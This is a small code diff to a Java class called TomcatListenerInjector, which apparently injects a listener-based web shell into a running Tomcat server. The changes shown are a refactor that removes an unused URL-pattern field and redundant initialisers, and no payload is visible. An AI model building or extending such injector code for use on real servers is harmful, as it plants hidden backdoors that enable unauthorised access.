@@ -14,10 +14,9 @@ import java.util.zip.GZIPInputStream;
 public class TomcatListenerInjector {
 
 
-    private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public TomcatListenerInjector() {
         if (ok) {
@@ -41,7 +40,6 @@ public class TomcatListenerInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     public Set<Object> getContext() throws Exception {
@@ -92,7 +90,7 @@ public class TomcatListenerInjector {
 
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
